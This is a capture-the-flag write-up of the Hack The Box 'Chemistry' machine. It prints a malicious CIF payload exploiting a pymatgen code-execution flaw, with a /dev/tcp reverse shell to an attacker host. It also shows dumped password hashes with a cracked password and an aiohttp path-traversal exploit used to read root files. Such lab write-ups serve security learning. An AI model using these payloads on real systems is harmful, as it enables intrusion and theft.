---
title: Chemistry
date: 2024-12-29
description: Exploited an insecure `pymatgen` implementation through malicious `.cif` file parsing to gain remote code execution, pivoted through exposed SQLite credentials for SSH access, then abused an `aiohttp` path traversal vulnerability on an internal service to capture root access.
tags:
  - htb
  - Easy
  - Linux
---

# Initial Recon

## Ports

```bash
22 - SSH
5000 - ?
```

Server information disclosure was exposed on port `5000` through a direct `netcat` connection.

```text
Server: Werkzeug/3.0.3 Python/3.9.5
```

# User

## Web Application

```text
http://chemistry.htb:5000/
```

Registered an account and accessed the dashboard.

The application allowed uploading `.cif` (`Crystallographic Information File`) files. Uploaded files could later be viewed directly from the dashboard, and an example `.cif` template was also provided.

> After looking into known vulnerabilities related to CIF parsing, this advisory stood out:
> https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0


Modified the payload to trigger a reverse shell:

```bash
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in
().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" +
"classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("sh -i >& /dev/tcp/<ip>/<port> 0>&1");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

The payload was appended to the provided `example.cif` file before uploading it back to the application.

Steps:

- Started a `netcat` listener
- Uploaded the modified `.cif`
- Triggered the payload by clicking **View**

Captured a reverse shell as the `app` user. Clean enough.

## Foothold

Enumerated local users through:

```bash
cat /etc/passwd
```

Discovered the user `rosa`.

While checking accessible directories under the `app` user, located:

```text
database.db
```

Observed SQLite activity running on the host:

```bash
ps aux
```

Interacted with the database:

```bash
sqlite3 database.db
.tables
select * from user;
```

Dumped credentials:

```text
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
```

Recovered credentials for `rosa`:

```text
unicorniosrosados
```

Authenticated as `rosa` and captured the user flag.

# Root

## Internal Services

Logged into the target through SSH as `rosa`.

```bash
ssh rosa@chemistry.htb
```

Uploaded and executed `linpeas.sh` for additional enumeration.

Initial scans only exposed two public ports, but local enumeration revealed additional active services:

```text
0.0.0.0:5000           0.0.0.0                LISTEN
127.0.0.1:8080         0.0.0.0                LISTEN
127.0.0.53:53          0.0.0.0                LISTEN
0.0.0.0:22             0.0.0.0                LISTEN
```

Port `8080` was bound locally.

Verified access from the compromised host:

```bash
curl http://localhost:8080/ --head
```

The service leaked additional version details:

```text
Server: Python/3.9 aiohttp/3.9.1
```

Searched for vulnerabilities affecting `aiohttp 3.9.1` and located the following PoC:

```text
https://github.com/z3rObyte/CVE-2024-23334-PoC
```

Copied the exploit script onto the target and executed it.

Initially the exploit returned a `404` error. After reviewing the payload behavior, adjusted the API endpoint inside the script:

```bash
payload="/static/"
```

At that point the actual problem was obvious — no clue what valid endpoints even existed yet. Time to enumerate properly instead of gambling payloads into the void.

Since the service was only reachable locally, SSH port forwarding was used.

On the attacker machine:

```bash
ssh -L 1234:localhost:8080 rosa@chemistry.htb
```

This exposed the internal service locally on port `1234`.

Performed directory enumeration with `feroxbuster` using the default wordlist and identified:

```text
/assets/
```

Updated the payload inside `exploit.sh`:

```bash
payload="/assets/"
```

The exploit executed successfully afterward.

The vulnerability allowed automated path traversal through crafted requests using:

```bash
curl --path-as-is
```

Modified the target file inside the exploit script:

```bash
file="/root/root.txt/"
```

Extracted the root flag successfully.

Gained `Root`
